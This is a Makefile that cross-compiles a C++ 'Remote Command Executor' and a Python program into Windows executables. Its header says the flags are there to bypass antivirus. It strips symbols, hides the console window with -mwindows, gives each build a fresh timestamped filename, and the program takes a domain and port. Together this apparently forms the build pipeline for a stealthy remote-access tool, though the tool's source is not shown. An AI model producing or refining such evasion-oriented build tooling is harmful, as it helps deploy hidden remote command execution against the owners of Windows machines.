# Makefile for C++ Remote Command Executor (MinGW-w64)
# Cross-compilation from Linux/macOS to Windows
# Enhanced with AV bypass compilation flags

CC = x86_64-w64-mingw32-g++
WINDRES = x86_64-w64-mingw32-windres
CFLAGS = -std=c++11 -O3 -static-libgcc -static-libstdc++ -static \
         -s -Wl,--strip-all \
         -fno-stack-protector -fno-ident \
         -ffunction-sections -fdata-sections \
         -Wl,--gc-sections -Wl,--build-id=none \
         -fomit-frame-pointer -fno-unroll-loops \
         -Wl,--disable-auto-import -Wl,--enable-auto-image-base \
         -mwindows
TIMESTAMP = $(shell date +%Y%m%d_%H%M%S)
TARGET = remote_command_executor_cpp_$(TIMESTAMP).exe
SOURCE = remote_command_executor.cpp
MANIFEST = app.manifest
RESOURCE = app.o
LIBS = -lws2_32 -ladvapi32 -lkernel32 -lntdll -lshell32

# Default target
all: $(TARGET)

# Build resource file from manifest
$(RESOURCE): app.rc $(MANIFEST)
	@echo "Creating resource file from manifest..."
	$(WINDRES) -F pe-x86-64 -i app.rc -o $(RESOURCE)

# Build target
$(TARGET): $(SOURCE) $(RESOURCE)
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCE) $(RESOURCE) $(LIBS)
	@echo "Build complete: $(TARGET)"
	@echo "Usage: $(TARGET) [domain] [port] [--debug]"

# Clean
clean:
	rm -f remote_command_executor_cpp_*.exe *.o *.res
	@echo "Cleaned build artifacts"

# Python executable build
PY_SOURCE = hansen-tcap.py
PY_SPEC = hansen-tcap.spec
PY_TIMESTAMP = $(shell date +%Y%m%d_%H%M%S)
PY_TARGET = hansen-tcap_$(PY_TIMESTAMP).exe
UNAME_S := $(shell uname -s 2>/dev/null || echo "Unknown")

py:
	@echo "Building Windows .exe using cross-compilation..."
	@if [ "$(UNAME_S)" = "Linux" ] || [ "$(UNAME_S)" = "Darwin" ]; then \
		if command -v docker >/dev/null 2>&1 && docker info >/dev/null 2>&1; then \
			$(MAKE) py-docker-windows; \
		elif command -v nuitka3 >/dev/null 2>&1 || python3 -m nuitka --version >/dev/null 2>&1; then \
			$(MAKE) py-nuitka; \
		else \
			echo "Docker not available. For Windows .exe cross-compilation:"; \
			echo "  1. Install Docker Desktop"; \
			echo "  2. Start Docker Desktop"; \
			echo "  3. Run: make py"; \
			echo ""; \
			echo "Attempting local build (will create $(UNAME_S) executable)..."; \
			$(MAKE) py-local; \
		fi; \
	else \
		$(MAKE) py-local; \
	fi

py-docker-windows:
	@echo "Using Docker with Wine for Windows cross-compilation..."
	@bash build_windows_exe.sh || { \
		echo "Wine-based build failed. Summary:"; \
		echo "  - Docker is required and must be running"; \
		echo "  - First build may take 10-15 minutes"; \
		echo "  - Alternative: Build on Windows machine"; \
		exit 1; \
	}

py-nuitka:
	@echo "Using Nuitka for Windows cross-compilation..."
	@if command -v nuitka3 >/dev/null 2>&1; then \
		NUITKA_CMD=nuitka3; \
	elif python3 -m nuitka --version >/dev/null 2>&1; then \
		NUITKA_CMD="python3 -m nuitka"; \
	else \
		echo "Error: Nuitka not found. Install with: pip install nuitka"; \
		exit 1; \
	fi; \
	if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then \
		echo "Error: mingw-w64 not found."; \
		if [ "$(UNAME_S)" = "Darwin" ]; then \
			echo "Install with: brew install mingw-w64"; \
		elif [ "$(UNAME_S)" = "Linux" ]; then \
			echo "Install with: sudo apt-get install mingw-w64"; \
		fi; \
		exit 1; \
	fi; \
	echo "Cross-compiling to Windows .exe..."; \
	export CC=x86_64-w64-mingw32-gcc; \
	export CXX=x86_64-w64-mingw32-g++; \
	export NUITKA_CROSS_PYTHON_BINARY=x86_64-w64-mingw32-python3 || true; \
	$$NUITKA_CMD \
		--standalone \
		--onefile \
		--assume-yes-for-downloads \
		--mingw64 \
		--static-libpython=no \
		--output-filename=hansen-tcap.exe \
		--output-dir=dist \
		--no-prefer-source-code \
		--plugin-enable=anti-bloat \
		--include-module=ctypes \
		--include-module=ctypes.wintypes \
		$(PY_SOURCE) 2>&1 | grep -v "WARNING\|anti-bloat" || true; \
	if [ -f dist/hansen-tcap.exe ]; then \
		mv dist/hansen-tcap.exe $(PY_TARGET); \
		echo "✓ Build complete: $(PY_TARGET)"; \
		echo "  File size: $$(ls -lh $(PY_TARGET) | awk '{print $$5}')"; \
		rm -rf dist build hansen-tcap.build hansen-tcap.dist __pycache__ *.spec.bak 2>/dev/null || true; \
	else \
		echo "Error: Windows .exe not created"; \
		exit 1; \
	fi

py-local:
	@echo "Building Python executable (local platform)..."
	@if command -v pyinstaller >/dev/null 2>&1; then \
		PYINSTALLER_CMD=pyinstaller; \
	elif python3 -m PyInstaller --version >/dev/null 2>&1; then \
		PYINSTALLER_CMD="python3 -m PyInstaller"; \
	else \
		echo "Error: PyInstaller not found."; \
		echo "Install it with: pip install pyinstaller"; \
		exit 1; \
	fi; \
	echo "Using PyInstaller spec file: $(PY_SPEC)"; \
	$$PYINSTALLER_CMD $(PY_SPEC); \
	if [ -f dist/hansen-tcap.exe ]; then \
		mv dist/hansen-tcap.exe $(PY_TARGET); \
		echo "Build complete: $(PY_TARGET)"; \
	elif [ -f dist/hansen-tcap ]; then \
		if [ "$(UNAME_S)" != "Linux" ] && [ "$(UNAME_S)" != "Darwin" ]; then \
			mv dist/hansen-tcap $(PY_TARGET); \
			echo "Build complete: $(PY_TARGET)"; \
		else \
			echo "Warning: Created $(UNAME_S) executable, not Windows .exe"; \
			echo "To create Windows .exe, use: make py (requires Docker)"; \
			mv dist/hansen-tcap hansen-tcap_$(PY_TIMESTAMP); \
		fi; \
	fi; \
	rm -rf build dist __pycache__ *.spec.bak;

.PHONY: all clean py
